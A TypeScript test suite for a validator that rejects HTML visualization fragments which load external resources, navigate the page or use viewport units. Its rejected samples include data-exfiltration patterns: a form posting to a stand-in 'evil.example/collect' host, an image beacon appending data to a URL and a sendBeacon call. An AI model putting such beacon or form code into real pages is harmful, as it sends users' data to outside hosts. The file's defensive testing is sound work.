import { describe, expect, test } from "bun:test";
import { VISUALIZATION_EXAMPLES } from "../../examples/index.ts";
import {
  VISUALIZATION_MAX_BYTES,
  type VisualizationRule,
  validateVisualization,
} from "../index.ts";

const rulesOf = (html: string, title = "A chart"): ReadonlyArray<VisualizationRule> =>
  validateVisualization({ title, html }).map((problem) => problem.rule);

describe("validateVisualization rejects", () => {
  const cases: ReadonlyArray<readonly [VisualizationRule, string, string]> = [
    ["too-large", "a fragment over 128 KiB", `<p>${"x".repeat(VISUALIZATION_MAX_BYTES)}</p>`],
    [
      "too-large",
      "a fragment over the cap in UTF-8 bytes, not chars",
      "é".repeat(VISUALIZATION_MAX_BYTES / 2 + 1),
    ],
    ["empty", "an empty body", ""],
    ["empty", "a whitespace body", "  \n\t "],
    ["full-document", "a leading doctype", "<!DOCTYPE html><p>hi</p>"],
    ["full-document", "a leading <html>", "  <html><p>hi</p></html>"],
    ["full-document", "a <head> after a comment", "<!-- chart --><head><style></style></head>"],
    ["full-document", "a leading <body>", "<body class='x'><p>hi</p></body>"],
    [
      "external-url",
      "a CDN script",
      '<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>',
    ],
    [
      "external-url",
      "a protocol-relative stylesheet",
      "<link rel=stylesheet href=//fonts.googleapis.com/css>",
    ],
    ["external-url", "a remote image", "<img alt='' src='http://example.com/a.png'>"],
    [
      "external-url",
      "a remote srcset candidate",
      '<img srcset="data:image/png;base64,AAAA 1x, https://x.io/b.png 2x">',
    ],
    ["external-url", "an iframe", '<iframe src="https://example.com"></iframe>'],
    ["external-url", "an object", '<object data="https://example.com/a.pdf"></object>'],
    ["external-url", "an embed", '<embed src="https://example.com/a.swf">'],
    ["external-url", "a srcdoc iframe", '<iframe srcdoc="<p>x</p>"></iframe>'],
    ["external-url", "an object without a URL", "<object></object>"],
    [
      "external-url",
      "a frame built in script",
      "<script>document.body.append(document.createElement('iframe'));</script>",
    ],
    ["external-url", "srcdoc set from script", "<script>frame.srcdoc = html;</script>"],
    [
      "external-url",
      "srcdoc set as an attribute",
      "<script>f.setAttribute('srcdoc', html);</script>",
    ],
    [
      "external-url",
      "a declarative shadow root",
      '<div><template shadowrootmode="closed"><p>x</p></template></div>',
    ],
    ["external-url", "document.write", "<script>document.write(markup);</script>"],
    ["external-url", "setHTMLUnsafe", "<script>host.setHTMLUnsafe(markup);</script>"],
    [
      "external-url",
      "a form action",
      '<form action="https://evil.example/collect"><input name=q></form>',
    ],
    ["external-url", "an external link", '<a href="https://example.com/docs">Docs</a>'],
    ["external-url", "a mailto link", '<a href="mailto:a@b.c">Mail</a>'],
    [
      "external-url",
      "a CSS url()",
      "<style>.hero { background: url(https://x.io/bg.jpg) }</style>",
    ],
    [
      "external-url",
      "a quoted CSS url()",
      "<div style=\"background-image:url('//x.io/bg.jpg')\"></div>",
    ],
    ["external-url", "an @import", "<style>@import 'theme.css';</style>"],
    [
      "external-url",
      "markup built in script",
      "<script>el.innerHTML = '<img src=\"https://x.io/p.gif\">';</script>",
    ],
    [
      "external-url",
      "a src assigned in script",
      "<script>new Image().src = 'https://x.io/beacon?d=' + data;</script>",
    ],
    [
      "external-url",
      "setAttribute with a URL",
      "<script>img.setAttribute('src', '//x.io/p.gif');</script>",
    ],
    ["external-url", "fetch", "<script>fetch('/api').then((r) => r.json());</script>"],
    ["external-url", "a WebSocket", "<script>const ws = new WebSocket('wss://x.io');</script>"],
    [
      "external-url",
      "WebRTC",
      "<script>const pc = new RTCPeerConnection({ iceServers });</script>",
    ],
    ["external-url", "sendBeacon", "<script>navigator.sendBeacon('/x', data);</script>"],
    ["navigation", "location.assign", "<script>location.assign('/next');</script>"],
    ["navigation", "location.replace", "<script>window.location.replace(url);</script>"],
    ["navigation", "location.href =", "<script>location.href = next;</script>"],
    ["navigation", "window.location =", "<script>window.location = next;</script>"],
    ["navigation", "a bare location =", "<script>location = next;</script>"],
    ["navigation", "location.reload", "<script>location.reload();</script>"],
    ["navigation", "window.open", "<script>window.open(url);</script>"],
    ["navigation", "top.location", "<script>top.location.href = url;</script>"],
    ["navigation", "parent.location", "<script>if (parent.location) {}</script>"],
    [
      "navigation",
      "a meta refresh",
      '<meta http-equiv="refresh" content="0;url=data:text/html,x">',
    ],
    ["navigation", "a <base>", '<base href="data:text/html,x">'],
    ["navigation", "a target=_top link", '<a href="#a" target="_top">A</a>'],
    ["viewport-units", "vh", "<style>.wrap { height: 80vh }</style>"],
    ["viewport-units", "dvh", "<style>.wrap { min-height: 100dvh }</style>"],
    ["viewport-units", "svh", "<div style='height:50svh'></div>"],
    ["viewport-units", "vh set from script", "<script>box.style.height = '60vh';</script>"],
    [
      "viewport-units",
      "height: 100% on html and body",
      "<style>html, body { height: 100%; }</style>",
    ],
    ["viewport-units", "min-height: 100% on body", "<style>body{margin:0;min-height:100%}</style>"],
    [
      "viewport-units",
      "height: 100% on :root",
      "<style>.a{color:red} :root { height:100% }</style>",
    ],
  ];

  test.each(cases)("%s: %s", (rule, _name, html) => {
    expect(rulesOf(html)).toEqual([rule]);
  });

  test.each([
    ["an empty title", ""],
    ["a blank title", "   "],
    ["a title over 120 characters", "x".repeat(121)],
    ["a title with a line break", "Loan\npayments"],
  ])("title: %s", (_name, title) => {
    expect(rulesOf("<p>ok</p>", title)).toEqual(["title"]);
  });

  test("every rule that applies, each with a fix naming the way out", () => {
    const problems = validateVisualization({
      title: "",
      html: '<!doctype html><img src="https://x.io/a.png"><script>window.open("x")</script><style>.a{height:10vh}</style>',
    });

    const fixes = new Map(problems.map((problem) => [problem.rule, problem.fix]));

    expect([...fixes.keys()]).toEqual([
      "title",
      "full-document",
      "external-url",
      "navigation",
      "viewport-units",
    ]);
    expect(fixes.get("title")).toContain("one-line title");
    expect(fixes.get("full-document")).toContain("Drop the <!doctype>");
    expect(fixes.get("external-url")).toContain("data: URIs");
    expect(fixes.get("external-url")).toContain(
      `<button class="pv-link" onclick="pv.openLink('https://example.com')">`
    );
    expect(fixes.get("navigation")).toContain("pv.openLink('https://example.com')");
    expect(fixes.get("viewport-units")).toContain("fixed px heights");
  });

  test("the message quotes the offending snippet", () => {
    const [problem] = validateVisualization({
      title: "T",
      html: '<p>ok</p><script src="https://cdn.example/lib.js"></script>',
    });

    expect(problem?.message).toContain('src=\\"https://cdn.example/lib.js\\"');
  });
});

describe("validateVisualization accepts", () => {
  test.each(Object.entries(VISUALIZATION_EXAMPLES))("the %s example", (_name, example) => {
    expect(validateVisualization(example)).toEqual([]);
  });

  test.each([
    ["data: images", '<img alt="dot" src="data:image/png;base64,iVBORw0KGgo=">'],
    [
      "a data: srcset",
      '<img alt="" srcset="data:image/png;base64,AA== 1x, data:image/png;base64,BB== 2x">',
    ],
    [
      "a data: CSS background",
      '<style>.a{background:url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E")}</style>',
    ],
    ["a data: link", '<a href="data:text/csv,a%2Cb" download="data.csv">CSV</a>'],
    [
      "the fix's own link-styled button",
      `<button class="pv-link" onclick="pv.openLink('https://example.com')">Docs</button>`,
    ],
    ["in-page anchors", '<a href="#details">Details</a><h2 id="details">Details</h2>'],
    [
      "an https URL handed to pv.openLink",
      "<button onclick=\"pv.openLink('https://example.com/docs')\">Docs</button>",
    ],
    [
      "URLs in prose and comments",
      "<p>See https://example.com.</p><script>// from https://x.io\n</script>",
    ],
    ["reading location.hash", "<script>const tab = location.hash.slice(1) || 'a';</script>"],
    ["comparing location.href", "<script>if (location.href === 'about:srcdoc') {}</script>"],
    [
      "a variable named location",
      "<script>const location = 'Newark'; let city = location;</script>",
    ],
    ["a method named open", "<script>dialog.open(); details.open = true;</script>"],
    [
      "fixed heights and 100% widths",
      "<style>.chart{height:280px;width:100%} .card { height: 100% }</style>",
    ],
    ["height: 100% on a body descendant", "<style>body .panel { height: 100% }</style>"],
    ["prose about viewports", "<p>The vh unit is banned here.</p>"],
    ["a tag named in a script string", "<script>const tag = '<head>';</script>"],
    ["a title at the limit", ""],
  ])("%s", (_name, html) => {
    expect(validateVisualization({ title: "x".repeat(120), html: html || "<p>ok</p>" })).toEqual(
      []
    );
  });
});
